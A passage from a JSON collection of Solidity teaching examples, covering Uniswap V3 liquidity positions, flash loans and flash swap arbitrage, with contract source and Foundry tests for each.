tokenId,\n            uint128 liquidity,\n            uint256 amount0,\n            uint256 amount1\n        )\n    {\n        dai.transferFrom(msg.sender, address(this), amount0ToAdd);\n        weth.transferFrom(msg.sender, address(this), amount1ToAdd);\n\n        dai.approve(address(nonfungiblePositionManager), amount0ToAdd);\n        weth.approve(address(nonfungiblePositionManager), amount1ToAdd);\n\n        INonfungiblePositionManager.MintParams memory params =\n        INonfungiblePositionManager.MintParams({\n            token0: DAI,\n            token1: WETH,\n            fee: 3000,\n            tickLower: (MIN_TICK / TICK_SPACING) * TICK_SPACING,\n            tickUpper: (MAX_TICK / TICK_SPACING) * TICK_SPACING,\n            amount0Desired: amount0ToAdd,\n            amount1Desired: amount1ToAdd,\n            amount0Min: 0,\n            amount1Min: 0,\n            recipient: address(this),\n            deadline: block.timestamp\n        });\n\n        (tokenId, liquidity, amount0, amount1) =\n            nonfungiblePositionManager.mint(params);\n\n        if (amount0 < amount0ToAdd) {\n            dai.approve(address(nonfungiblePositionManager), 0);\n            uint256 refund0 = amount0ToAdd - amount0;\n            dai.transfer(msg.sender, refund0);\n        }\n        if (amount1 < amount1ToAdd) {\n            weth.approve(address(nonfungiblePositionManager), 0);\n            uint256 refund1 = amount1ToAdd - amount1;\n            weth.transfer(msg.sender, refund1);\n        }\n    }\n\n    function collectAllFees(uint256 tokenId)\n        external\n        returns (uint256 amount0, uint256 amount1)\n    {\n        INonfungiblePositionManager.CollectParams memory params =\n        INonfungiblePositionManager.CollectParams({\n            tokenId: tokenId,\n            recipient: address(this),\n            amount0Max: type(uint128).max,\n            amount1Max: type(uint128).max\n        });\n\n        (amount0, amount1) = nonfungiblePositionManager.collect(params);\n    }\n\n    function increaseLiquidityCurrentRange(\n        uint256 tokenId,\n        uint256 amount0ToAdd,\n        uint256 amount1ToAdd\n    ) external returns (uint128 liquidity, uint256 amount0, uint256 amount1) {\n        dai.transferFrom(msg.sender, address(this), amount0ToAdd);\n        weth.transferFrom(msg.sender, address(this), amount1ToAdd);\n\n        dai.approve(address(nonfungiblePositionManager), amount0ToAdd);\n        weth.approve(address(nonfungiblePositionManager), amount1ToAdd);\n\n        INonfungiblePositionManager.IncreaseLiquidityParams memory params =\n        INonfungiblePositionManager.IncreaseLiquidityParams({\n            tokenId: tokenId,\n            amount0Desired: amount0ToAdd,\n            amount1Desired: amount1ToAdd,\n            amount0Min: 0,\n            amount1Min: 0,\n            deadline: block.timestamp\n        });\n\n        (liquidity, amount0, amount1) =\n            nonfungiblePositionManager.increaseLiquidity(params);\n    }\n\n    function decreaseLiquidityCurrentRange(uint256 tokenId, uint128 liquidity)\n        external\n        returns (uint256 amount0, uint256 amount1)\n    {\n        INonfungiblePositionManager.DecreaseLiquidityParams memory params =\n        INonfungiblePositionManager.DecreaseLiquidityParams({\n            tokenId: tokenId,\n            liquidity: liquidity,\n            amount0Min: 0,\n            amount1Min: 0,\n            deadline: block.timestamp\n        });\n\n        (amount0, amount1) =\n            nonfungiblePositionManager.decreaseLiquidity(params);\n    }\n}\n\ninterface INonfungiblePositionManager {\n    struct MintParams {\n        address token0;\n        address token1;\n        uint24 fee;\n        int24 tickLower;\n        int24 tickUpper;\n        uint256 amount0Desired;\n        uint256 amount1Desired;\n        uint256 amount0Min;\n        uint256 amount1Min;\n        address recipient;\n        uint256 deadline;\n    }\n\n    function mint(MintParams calldata params)\n        external\n        payable\n        returns (\n            uint256 tokenId,\n            uint128 liquidity,\n            uint256 amount0,\n            uint256 amount1\n        );\n\n    struct IncreaseLiquidityParams {\n        uint256 tokenId;\n        uint256 amount0Desired;\n        uint256 amount1Desired;\n        uint256 amount0Min;\n        uint256 amount1Min;\n        uint256 deadline;\n    }\n\n    function increaseLiquidity(IncreaseLiquidityParams calldata params)\n        external\n        payable\n        returns (uint128 liquidity, uint256 amount0, uint256 amount1);\n\n    struct DecreaseLiquidityParams {\n        uint256 tokenId;\n        uint128 liquidity;\n        uint256 amount0Min;\n        uint256 amount1Min;\n        uint256 deadline;\n    }\n\n    function decreaseLiquidity(DecreaseLiquidityParams calldata params)\n        external\n        payable\n        returns (uint256 amount0, uint256 amount1);\n\n    struct CollectParams {\n        uint256 tokenId;\n        address recipient;\n        uint128 amount0Max;\n        uint128 amount1Max;\n    }\n\n    function collect(CollectParams calldata params)\n        external\n        payable\n        returns (uint256 amount0, uint256 amount1);\n}\n\ninterface IERC20 {\n    function totalSupply() external view returns (uint256);\n    function balanceOf(address account) external view returns (uint256);\n    function transfer(address recipient, uint256 amount)\n        external\n        returns (bool);\n    function allowance(address owner, address spender)\n        external\n        view\n        returns (uint256);\n    function approve(address spender, uint256 amount) external returns (bool);\n    function transferFrom(address sender, address recipient, uint256 amount)\n        external\n        returns (bool);\n}\n\ninterface IWETH is IERC20 {\n    function deposit() external payable;\n    function withdraw(uint256 amount) external;\n}\n\n```\n\n### Test with Foundry\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\nimport {Test, console2} from \"forge-std/Test.sol\";\nimport \"../../../src/defi/uniswap-v3-liquidity/UniswapV3Liquidity.sol\";\n\ncontract UniswapV3LiquidityTest is Test {\n    IWETH private constant weth = IWETH(WETH);\n    IERC20 private constant dai = IERC20(DAI);\n\n    address private constant DAI_WHALE =\n        0xe81D6f03028107A20DBc83176DA82aE8099E9C42;\n\n    UniswapV3Liquidity private uni = new UniswapV3Liquidity();\n\n    function setUp() public {\n        vm.prank(DAI_WHALE);\n        dai.transfer(address(this), 20 * 1e18);\n\n        weth.deposit{value: 2 * 1e18}();\n\n        dai.approve(address(uni), 20 * 1e18);\n        weth.approve(address(uni), 2 * 1e18);\n    }\n\n    function testLiquidity() public {\n        // Track total liquidity\n        uint128 liquidity;\n\n        // Mint new position\n        uint256 daiAmount = 10 * 1e18;\n        uint256 wethAmount = 1e18;\n\n        (\n            uint256 tokenId,\n            uint128 liquidityDelta,\n            uint256 amount0,\n            uint256 amount1\n        ) = uni.mintNewPosition(daiAmount, wethAmount);\n        liquidity += liquidityDelta;\n\n        console2.log(\"--- Mint new position ---\");\n        console2.log(\"token id\", tokenId);\n        console2.log(\"liquidity\", liquidity);\n        console2.log(\"amount 0\", amount0);\n        console2.log(\"amount 1\", amount1);\n\n        // Collect fees\n        (uint256 fee0, uint256 fee1) = uni.collectAllFees(tokenId);\n\n        console2.log(\"--- Collect fees ---\");\n        console2.log(\"fee 0\", fee0);\n        console2.log(\"fee 1\", fee1);\n\n        // Increase liquidity\n        uint256 daiAmountToAdd = 5 * 1e18;\n        uint256 wethAmountToAdd = 0.5 * 1e18;\n\n        (liquidityDelta, amount0, amount1) = uni.increaseLiquidityCurrentRange(\n            tokenId, daiAmountToAdd, wethAmountToAdd\n        );\n        liquidity += liquidityDelta;\n\n        console2.log(\"--- Increase liquidity ---\");\n        console2.log(\"liquidity\", liquidity);\n        console2.log(\"amount 0\", amount0);\n        console2.log(\"amount 1\", amount1);\n\n        // Decrease liquidity\n        (amount0, amount1) =\n            uni.decreaseLiquidityCurrentRange(tokenId, liquidity);\n        console2.log(\"--- Decrease liquidity ---\");\n        console2.log(\"amount 0\", amount0);\n        console2.log(\"amount 1\", amount1);\n    }\n}\n\n```\n\n### Links\n\n<a href=\"https://docs.uniswap.org/protocol/guides/providing-liquidity/setting-up\" target=\"__blank\">Uniswap V3</a>\n\n<a href=\"https://github.com/foundry-rs/foundry\" target=\"__blank\">Foundry</a>\n\n<a href=\"https://github.com/t4sk/defi-notes\" target=\"__blank\">Uniswap V3 Foundry example</a>",
    "codes": [
      {
        "fileName": "UniswapV3Liquidity.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\naddress constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;\naddress constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;\n\ninterface IERC721Receiver {\n    function onERC721Received(\n        address operator,\n        address from,\n        uint256 tokenId,\n        bytes calldata data\n    ) external returns (bytes4);\n}\n\ncontract UniswapV3Liquidity is IERC721Receiver {\n    IERC20 private constant dai = IERC20(DAI);\n    IWETH private constant weth = IWETH(WETH);\n\n    int24 private constant MIN_TICK = -887272;\n    int24 private constant MAX_TICK = -MIN_TICK;\n    int24 private constant TICK_SPACING = 60;\n\n    INonfungiblePositionManager public nonfungiblePositionManager =\n        INonfungiblePositionManager(0xC36442b4a4522E871399CD717aBDD847Ab11FE88);\n\n    function onERC721Received(\n        address operator,\n        address from,\n        uint256 tokenId,\n        bytes calldata\n    ) external returns (bytes4) {\n        return IERC721Receiver.onERC721Received.selector;\n    }\n\n    function mintNewPosition(uint256 amount0ToAdd, uint256 amount1ToAdd)\n        external\n        returns (\n            uint256 tokenId,\n            uint128 liquidity,\n            uint256 amount0,\n            uint256 amount1\n        )\n    {\n        dai.transferFrom(msg.sender, address(this), amount0ToAdd);\n        weth.transferFrom(msg.sender, address(this), amount1ToAdd);\n\n        dai.approve(address(nonfungiblePositionManager), amount0ToAdd);\n        weth.approve(address(nonfungiblePositionManager), amount1ToAdd);\n\n        INonfungiblePositionManager.MintParams memory params =\n        INonfungiblePositionManager.MintParams({\n            token0: DAI,\n            token1: WETH,\n            fee: 3000,\n            tickLower: (MIN_TICK / TICK_SPACING) * TICK_SPACING,\n            tickUpper: (MAX_TICK / TICK_SPACING) * TICK_SPACING,\n            amount0Desired: amount0ToAdd,\n            amount1Desired: amount1ToAdd,\n            amount0Min: 0,\n            amount1Min: 0,\n            recipient: address(this),\n            deadline: block.timestamp\n        });\n\n        (tokenId, liquidity, amount0, amount1) =\n            nonfungiblePositionManager.mint(params);\n\n        if (amount0 < amount0ToAdd) {\n            dai.approve(address(nonfungiblePositionManager), 0);\n            uint256 refund0 = amount0ToAdd - amount0;\n            dai.transfer(msg.sender, refund0);\n        }\n        if (amount1 < amount1ToAdd) {\n            weth.approve(address(nonfungiblePositionManager), 0);\n            uint256 refund1 = amount1ToAdd - amount1;\n            weth.transfer(msg.sender, refund1);\n        }\n    }\n\n    function collectAllFees(uint256 tokenId)\n        external\n        returns (uint256 amount0, uint256 amount1)\n    {\n        INonfungiblePositionManager.CollectParams memory params =\n        INonfungiblePositionManager.CollectParams({\n            tokenId: tokenId,\n            recipient: address(this),\n            amount0Max: type(uint128).max,\n            amount1Max: type(uint128).max\n        });\n\n        (amount0, amount1) = nonfungiblePositionManager.collect(params);\n    }\n\n    function increaseLiquidityCurrentRange(\n        uint256 tokenId,\n        uint256 amount0ToAdd,\n        uint256 amount1ToAdd\n    ) external returns (uint128 liquidity, uint256 amount0, uint256 amount1) {\n        dai.transferFrom(msg.sender, address(this), amount0ToAdd);\n        weth.transferFrom(msg.sender, address(this), amount1ToAdd);\n\n        dai.approve(address(nonfungiblePositionManager), amount0ToAdd);\n        weth.approve(address(nonfungiblePositionManager), amount1ToAdd);\n\n        INonfungiblePositionManager.IncreaseLiquidityParams memory params =\n        INonfungiblePositionManager.IncreaseLiquidityParams({\n            tokenId: tokenId,\n            amount0Desired: amount0ToAdd,\n            amount1Desired: amount1ToAdd,\n            amount0Min: 0,\n            amount1Min: 0,\n            deadline: block.timestamp\n        });\n\n        (liquidity, amount0, amount1) =\n            nonfungiblePositionManager.increaseLiquidity(params);\n    }\n\n    function decreaseLiquidityCurrentRange(uint256 tokenId, uint128 liquidity)\n        external\n        returns (uint256 amount0, uint256 amount1)\n    {\n        INonfungiblePositionManager.DecreaseLiquidityParams memory params =\n        INonfungiblePositionManager.DecreaseLiquidityParams({\n            tokenId: tokenId,\n            liquidity: liquidity,\n            amount0Min: 0,\n            amount1Min: 0,\n            deadline: block.timestamp\n        });\n\n        (amount0, amount1) =\n            nonfungiblePositionManager.decreaseLiquidity(params);\n    }\n}\n\ninterface INonfungiblePositionManager {\n    struct MintParams {\n        address token0;\n        address token1;\n        uint24 fee;\n        int24 tickLower;\n        int24 tickUpper;\n        uint256 amount0Desired;\n        uint256 amount1Desired;\n        uint256 amount0Min;\n        uint256 amount1Min;\n        address recipient;\n        uint256 deadline;\n    }\n\n    function mint(MintParams calldata params)\n        external\n        payable\n        returns (\n            uint256 tokenId,\n            uint128 liquidity,\n            uint256 amount0,\n            uint256 amount1\n        );\n\n    struct IncreaseLiquidityParams {\n        uint256 tokenId;\n        uint256 amount0Desired;\n        uint256 amount1Desired;\n        uint256 amount0Min;\n        uint256 amount1Min;\n        uint256 deadline;\n    }\n\n    function increaseLiquidity(IncreaseLiquidityParams calldata params)\n        external\n        payable\n        returns (uint128 liquidity, uint256 amount0, uint256 amount1);\n\n    struct DecreaseLiquidityParams {\n        uint256 tokenId;\n        uint128 liquidity;\n        uint256 amount0Min;\n        uint256 amount1Min;\n        uint256 deadline;\n    }\n\n    function decreaseLiquidity(DecreaseLiquidityParams calldata params)\n        external\n        payable\n        returns (uint256 amount0, uint256 amount1);\n\n    struct CollectParams {\n        uint256 tokenId;\n        address recipient;\n        uint128 amount0Max;\n        uint128 amount1Max;\n    }\n\n    function collect(CollectParams calldata params)\n        external\n        payable\n        returns (uint256 amount0, uint256 amount1);\n}\n\ninterface IERC20 {\n    function totalSupply() external view returns (uint256);\n    function balanceOf(address account) external view returns (uint256);\n    function transfer(address recipient, uint256 amount)\n        external\n        returns (bool);\n    function allowance(address owner, address spender)\n        external\n        view\n        returns (uint256);\n    function approve(address spender, uint256 amount) external returns (bool);\n    function transferFrom(address sender, address recipient, uint256 amount)\n        external\n        returns (bool);\n}\n\ninterface IWETH is IERC20 {\n    function deposit() external payable;\n    function withdraw(uint256 amount) external;\n}\n"
      },
      {
        "fileName": "UniswapV3LiquidityTest.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\nimport {Test, console2} from \"forge-std/Test.sol\";\nimport \"../../../src/defi/uniswap-v3-liquidity/UniswapV3Liquidity.sol\";\n\ncontract UniswapV3LiquidityTest is Test {\n    IWETH private constant weth = IWETH(WETH);\n    IERC20 private constant dai = IERC20(DAI);\n\n    address private constant DAI_WHALE =\n        0xe81D6f03028107A20DBc83176DA82aE8099E9C42;\n\n    UniswapV3Liquidity private uni = new UniswapV3Liquidity();\n\n    function setUp() public {\n        vm.prank(DAI_WHALE);\n        dai.transfer(address(this), 20 * 1e18);\n\n        weth.deposit{value: 2 * 1e18}();\n\n        dai.approve(address(uni), 20 * 1e18);\n        weth.approve(address(uni), 2 * 1e18);\n    }\n\n    function testLiquidity() public {\n        // Track total liquidity\n        uint128 liquidity;\n\n        // Mint new position\n        uint256 daiAmount = 10 * 1e18;\n        uint256 wethAmount = 1e18;\n\n        (\n            uint256 tokenId,\n            uint128 liquidityDelta,\n            uint256 amount0,\n            uint256 amount1\n        ) = uni.mintNewPosition(daiAmount, wethAmount);\n        liquidity += liquidityDelta;\n\n        console2.log(\"--- Mint new position ---\");\n        console2.log(\"token id\", tokenId);\n        console2.log(\"liquidity\", liquidity);\n        console2.log(\"amount 0\", amount0);\n        console2.log(\"amount 1\", amount1);\n\n        // Collect fees\n        (uint256 fee0, uint256 fee1) = uni.collectAllFees(tokenId);\n\n        console2.log(\"--- Collect fees ---\");\n        console2.log(\"fee 0\", fee0);\n        console2.log(\"fee 1\", fee1);\n\n        // Increase liquidity\n        uint256 daiAmountToAdd = 5 * 1e18;\n        uint256 wethAmountToAdd = 0.5 * 1e18;\n\n        (liquidityDelta, amount0, amount1) = uni.increaseLiquidityCurrentRange(\n            tokenId, daiAmountToAdd, wethAmountToAdd\n        );\n        liquidity += liquidityDelta;\n\n        console2.log(\"--- Increase liquidity ---\");\n        console2.log(\"liquidity\", liquidity);\n        console2.log(\"amount 0\", amount0);\n        console2.log(\"amount 1\", amount1);\n\n        // Decrease liquidity\n        (amount0, amount1) =\n            uni.decreaseLiquidityCurrentRange(tokenId, liquidity);\n        console2.log(\"--- Decrease liquidity ---\");\n        console2.log(\"amount 0\", amount0);\n        console2.log(\"amount 1\", amount1);\n    }\n}\n"
      }
    ],
    "version": "0.8.26",
    "keywords": [
      "defi",
      "uniswap",
      "v3",
      "liquidity",
      "amm"
    ],
    "order": 5
  },
  {
    "slug": "uniswap-v3-flash",
    "title": "Uniswap V3 Flash Loan",
    "category": "DeFi",
    "categorySlug": "defi",
    "description": "Uniswap V3 Flash Loan",
    "content": "### Uniswap V3 Flash Loan Example\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract UniswapV3Flash {\n    struct FlashCallbackData {\n        uint256 amount0;\n        uint256 amount1;\n        address caller;\n    }\n\n    IUniswapV3Pool private immutable pool;\n    IERC20 private immutable token0;\n    IERC20 private immutable token1;\n\n    constructor(address _pool) {\n        pool = IUniswapV3Pool(_pool);\n        token0 = IERC20(pool.token0());\n        token1 = IERC20(pool.token1());\n    }\n\n    function flash(uint256 amount0, uint256 amount1) external {\n        bytes memory data = abi.encode(\n            FlashCallbackData({\n                amount0: amount0,\n                amount1: amount1,\n                caller: msg.sender\n            })\n        );\n        IUniswapV3Pool(pool).flash(address(this), amount0, amount1, data);\n    }\n\n    function uniswapV3FlashCallback(\n        // Pool fee x amount requested\n        uint256 fee0,\n        uint256 fee1,\n        bytes calldata data\n    ) external {\n        require(msg.sender == address(pool), \"not authorized\");\n\n        FlashCallbackData memory decoded = abi.decode(data, (FlashCallbackData));\n\n        // Write custom code here\n        if (fee0 > 0) {\n            token0.transferFrom(decoded.caller, address(this), fee0);\n        }\n        if (fee1 > 0) {\n            token1.transferFrom(decoded.caller, address(this), fee1);\n        }\n\n        // Repay borrow\n        if (fee0 > 0) {\n            token0.transfer(address(pool), decoded.amount0 + fee0);\n        }\n        if (fee1 > 0) {\n            token1.transfer(address(pool), decoded.amount1 + fee1);\n        }\n    }\n}\n\ninterface IUniswapV3Pool {\n    function token0() external view returns (address);\n    function token1() external view returns (address);\n    function flash(\n        address recipient,\n        uint256 amount0,\n        uint256 amount1,\n        bytes calldata data\n    ) external;\n}\n\ninterface IERC20 {\n    function totalSupply() external view returns (uint256);\n    function balanceOf(address account) external view returns (uint256);\n    function transfer(address recipient, uint256 amount)\n        external\n        returns (bool);\n    function transferFrom(address sender, address recipient, uint256 amount)\n        external\n        returns (bool);\n    function allowance(address owner, address spender)\n        external\n        view\n        returns (uint256);\n    function approve(address spender, uint256 amount) external returns (bool);\n}\n\n```\n\n### Test with Foundry\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\nimport {Test, console2} from \"forge-std/Test.sol\";\nimport \"../../../src/defi/uniswap-v3-flash/UniswapV3Flash.sol\";\n\ncontract UniswapV3FlashTest is Test {\n    address constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;\n    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;\n    // DAI / WETH 0.3% fee\n    address constant POOL = 0xC2e9F25Be6257c210d7Adf0D4Cd6E3E881ba25f8;\n    uint24 constant POOL_FEE = 3000;\n\n    IERC20 private constant weth = IERC20(WETH);\n    IERC20 private constant dai = IERC20(DAI);\n    UniswapV3Flash private uni;\n    address constant user = address(11);\n\n    function setUp() public {\n        uni = new UniswapV3Flash(POOL);\n\n        deal(DAI, user, 1e6 * 1e18);\n        vm.prank(user);\n        dai.approve(address(uni), type(uint256).max);\n    }\n\n    function test_flash() public {\n        uint256 dai_before = dai.balanceOf(user);\n        vm.prank(user);\n        uni.flash(1e6 * 1e18, 0);\n        uint256 dai_after = dai.balanceOf(user);\n\n        uint256 fee = dai_before - dai_after;\n        console2.log(\"DAI fee\", fee);\n    }\n}\n\n```",
    "codes": [
      {
        "fileName": "UniswapV3Flash.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract UniswapV3Flash {\n    struct FlashCallbackData {\n        uint256 amount0;\n        uint256 amount1;\n        address caller;\n    }\n\n    IUniswapV3Pool private immutable pool;\n    IERC20 private immutable token0;\n    IERC20 private immutable token1;\n\n    constructor(address _pool) {\n        pool = IUniswapV3Pool(_pool);\n        token0 = IERC20(pool.token0());\n        token1 = IERC20(pool.token1());\n    }\n\n    function flash(uint256 amount0, uint256 amount1) external {\n        bytes memory data = abi.encode(\n            FlashCallbackData({\n                amount0: amount0,\n                amount1: amount1,\n                caller: msg.sender\n            })\n        );\n        IUniswapV3Pool(pool).flash(address(this), amount0, amount1, data);\n    }\n\n    function uniswapV3FlashCallback(\n        // Pool fee x amount requested\n        uint256 fee0,\n        uint256 fee1,\n        bytes calldata data\n    ) external {\n        require(msg.sender == address(pool), \"not authorized\");\n\n        FlashCallbackData memory decoded = abi.decode(data, (FlashCallbackData));\n\n        // Write custom code here\n        if (fee0 > 0) {\n            token0.transferFrom(decoded.caller, address(this), fee0);\n        }\n        if (fee1 > 0) {\n            token1.transferFrom(decoded.caller, address(this), fee1);\n        }\n\n        // Repay borrow\n        if (fee0 > 0) {\n            token0.transfer(address(pool), decoded.amount0 + fee0);\n        }\n        if (fee1 > 0) {\n            token1.transfer(address(pool), decoded.amount1 + fee1);\n        }\n    }\n}\n\ninterface IUniswapV3Pool {\n    function token0() external view returns (address);\n    function token1() external view returns (address);\n    function flash(\n        address recipient,\n        uint256 amount0,\n        uint256 amount1,\n        bytes calldata data\n    ) external;\n}\n\ninterface IERC20 {\n    function totalSupply() external view returns (uint256);\n    function balanceOf(address account) external view returns (uint256);\n    function transfer(address recipient, uint256 amount)\n        external\n        returns (bool);\n    function transferFrom(address sender, address recipient, uint256 amount)\n        external\n        returns (bool);\n    function allowance(address owner, address spender)\n        external\n        view\n        returns (uint256);\n    function approve(address spender, uint256 amount) external returns (bool);\n}\n"
      },
      {
        "fileName": "UniswapV3FlashTest.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\nimport {Test, console2} from \"forge-std/Test.sol\";\nimport \"../../../src/defi/uniswap-v3-flash/UniswapV3Flash.sol\";\n\ncontract UniswapV3FlashTest is Test {\n    address constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;\n    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;\n    // DAI / WETH 0.3% fee\n    address constant POOL = 0xC2e9F25Be6257c210d7Adf0D4Cd6E3E881ba25f8;\n    uint24 constant POOL_FEE = 3000;\n\n    IERC20 private constant weth = IERC20(WETH);\n    IERC20 private constant dai = IERC20(DAI);\n    UniswapV3Flash private uni;\n    address constant user = address(11);\n\n    function setUp() public {\n        uni = new UniswapV3Flash(POOL);\n\n        deal(DAI, user, 1e6 * 1e18);\n        vm.prank(user);\n        dai.approve(address(uni), type(uint256).max);\n    }\n\n    function test_flash() public {\n        uint256 dai_before = dai.balanceOf(user);\n        vm.prank(user);\n        uni.flash(1e6 * 1e18, 0);\n        uint256 dai_after = dai.balanceOf(user);\n\n        uint256 fee = dai_before - dai_after;\n        console2.log(\"DAI fee\", fee);\n    }\n}\n"
      }
    ],
    "version": "0.8.26",
    "keywords": [
      "defi",
      "uniswap",
      "v3",
      "flash",
      "loan",
      "amm"
    ],
    "order": 6
  },
  {
    "slug": "uniswap-v3-flash-swap",
    "title": "Uniswap V3 Flash Swap Arbitrage",
    "category": "DeFi",
    "categorySlug": "defi",
    "description": "Uniswap V3 Flash Swap Arbitrage",
    "content": "### Uniswap V3 Flash Swap Arbitrage Example\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\naddress constant SWAP_ROUTER_02 = 0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45;\n\ncontract UniswapV3FlashSwap {\n    ISwapRouter02 constant router = ISwapRouter02(SWAP_ROUTER_02);\n\n    uint160 private constant MIN_SQRT_RATIO = 4295128739;\n    uint160 private constant MAX_SQRT_RATIO =\n        1461446703485210103287273052203988822378723970342;\n\n    // DAI / WETH 0.3% swap fee (2000 DAI / WETH)\n    // DAI / WETH 0.05% swap fee (2100 DAI / WETH)\n    // 1. Flash swap on pool0 (receive WETH)\n    // 2. Swap on pool1 (WETH -> DAI)\n    // 3. Send DAI to pool0\n    // profit = DAI received from pool1 - DAI repaid to pool0\n\n    function flashSwap(\n        address pool0,\n        uint24 fee1,\n        address tokenIn,\n        address tokenOut,\n        uint256 amountIn\n    ) external {\n        bool zeroForOne = tokenIn < tokenOut;\n        // 0 -> 1 => sqrt price decrease\n        // 1 -> 0 => sqrt price increase\n        uint160 sqrtPriceLimitX96 =\n            zeroForOne ? MIN_SQRT_RATIO + 1 : MAX_SQRT_RATIO - 1;\n\n        bytes memory data = abi.encode(\n            msg.sender, pool0, fee1, tokenIn, tokenOut, amountIn, zeroForOne\n        );\n\n        IUniswapV3Pool(pool0).swap({\n            recipient: address(this),\n            zeroForOne: zeroForOne,\n            amountSpecified: int256(amountIn),\n            sqrtPriceLimitX96: sqrtPriceLimitX96,\n            data: data\n        });\n    }\n\n    function _swap(\n        address tokenIn,\n        address tokenOut,\n        uint24 fee,\n        uint256 amountIn,\n        uint256 amountOutMin\n    ) private returns (uint256 amountOut) {\n        IERC20(tokenIn).approve(address(router), amountIn);\n\n        ISwapRouter02.ExactInputSingleParams memory params = ISwapRouter02\n            .ExactInputSingleParams({\n            tokenIn: tokenIn,\n            tokenOut: tokenOut,\n            fee: fee,\n            recipient: address(this),\n            amountIn: amountIn,\n            amountOutMinimum: amountOutMin,\n            sqrtPriceLimitX96: 0\n        });\n\n        amountOut = router.exactInputSingle(params);\n    }\n\n    function uniswapV3SwapCallback(\n        int256 amount0,\n        int256 amount1,\n        bytes calldata data\n    ) external {\n        // Decode data\n        (\n            address caller,\n            address pool0,\n            uint24 fee1,\n            address tokenIn,\n            address tokenOut,\n            uint256 amountIn,\n            bool zeroForOne\n        ) = abi.decode(\n            data, (address, address, uint24, address, address, uint256, bool)\n        );\n\n        uint256 amountOut = zeroForOne ? uint256(-amount1) : uint256(-amount0);\n\n        // pool0 -> tokenIn -> tokenOut (amountOut)\n        // Swap on pool 1 (swap tokenOut -> tokenIn)\n        uint256 buyBackAmount = _swap({\n            tokenIn: tokenOut,\n            tokenOut: tokenIn,\n            fee: fee1,\n            amountIn: amountOut,\n            amountOutMin: amountIn\n        });\n\n        // Repay pool 0\n        uint256 profit = buyBackAmount - amountIn;\n        require(profit > 0, \"profit = 0\");\n\n        IERC20(tokenIn).transfer(pool0, amountIn);\n        IERC20(tokenIn).transfer(caller, profit);\n    }\n}\n\ninterface ISwapRouter02 {\n    struct ExactInputSingleParams {\n        address tokenIn;\n        address tokenOut;\n        uint24 fee;\n        address recipient;\n        uint256 amountIn;\n        uint256 amountOutMinimum;\n        uint160 sqrtPriceLimitX96;\n    }\n\n    function exactInputSingle(ExactInputSingleParams calldata params)\n        external\n        payable\n        returns (uint256 amountOut);\n}\n\ninterface IUniswapV3Pool {\n    function swap(\n        address recipient,\n        bool zeroForOne,\n        int256 amountSpecified,\n        uint160 sqrtPriceLimitX96,\n        bytes calldata data\n    ) external returns (int256 amount0, int256 amount1);\n}\n\ninterface IERC20 {\n    function totalSupply() external view returns (uint256);\n    function balanceOf(address account) external view returns (uint256);\n    function transfer(address recipient, uint256 amount)\n        external\n        returns (bool);\n    function allowance(address owner, address spender)\n        external\n        view\n        returns (uint256);\n    function approve(address spender, uint256 amount) external returns (bool);\n    function transferFrom(address sender, address recipient, uint256 amount)\n        external\n        returns (bool);\n}\n\ninterface IWETH is IERC20 {\n    function deposit() external payable;\n    function withdraw(uint256 amount) external;\n}\n\n```\n\n### Test with Foundry\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity 0.8.26;\n\nimport {Test, console2} from \"forge-std/Test.sol\";\nimport {\n    UniswapV3FlashSwap,\n    IUniswapV3Pool,\n    ISwapRouter02,\n    IERC20,\n    IWETH\n} from \"../../../src/defi/uniswap-v3-flash-swap/UniswapV3FlashSwap.sol\";\n\naddress constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;\naddress constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;\naddress constant SWAP_ROUTER_02 = 0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45;\naddress constant DAI_WETH_POOL_3000 = 0xC2e9F25Be6257c210d7Adf0D4Cd6E3E881ba25f8;\naddress constant DAI_WETH_POOL_500 = 0x60594a405d53811d3BC4766596EFD80fd545A270;\nuint24 constant FEE_0 = 3000;\nuint24 constant FEE_1 = 500;\n\ncontract UniswapV3FlashTest is Test {\n    IERC20 private constant dai = IERC20(DAI);\n    IWETH private constant weth = IWETH(WETH);\n    ISwapRouter02 private constant router = ISwapRouter02(SWAP_ROUTER_02);\n    IUniswapV3Pool private constant pool0 = IUniswapV3Pool(DAI_WETH_POOL_3000);\n    IUniswapV3Pool private constant pool1 = IUniswapV3Pool(DAI_WETH_POOL_500);\n    UniswapV3FlashSwap private flashSwap;\n\n    uint256 private constant DAI_AMOUNT_IN = 10 * 1e18;\n\n    function setUp() public {\n        flashSwap = new UniswapV3FlashSwap();\n\n        // Create an arbitrage opportunity - make WETH cheaper on pool0\n        weth.deposit{value: 500 * 1e18}();\n        weth.approve(address(router), 500 * 1e18);\n        router.exactInputSingle(\n            ISwapRouter02.ExactInputSingleParams({\n                tokenIn: WETH,\n                tokenOut: DAI,\n                fee: FEE_0,\n                recipient: address(0),\n                amountIn: 500 * 1e18,\n                amountOutMinimum: 0,\n                sqrtPriceLimitX96: 0\n            })\n        );\n    }\n\n    function test_flashSwap() public {\n        uint256 bal0 = dai.balanceOf(address(this));\n        flashSwap.flashSwap({\n            pool0: address(pool0),\n            fee1: FEE_1,\n            tokenIn: DAI,\n            tokenOut: WETH,\n            amountIn: DAI_AMOUNT_IN\n        });\n        uint256 bal1 = dai.balanceOf(address(this));\n        uint256 profit = bal1 - bal0;\n        assertGt(profit, 0, \"profit = 0\");\n        console2.log(\"Profit 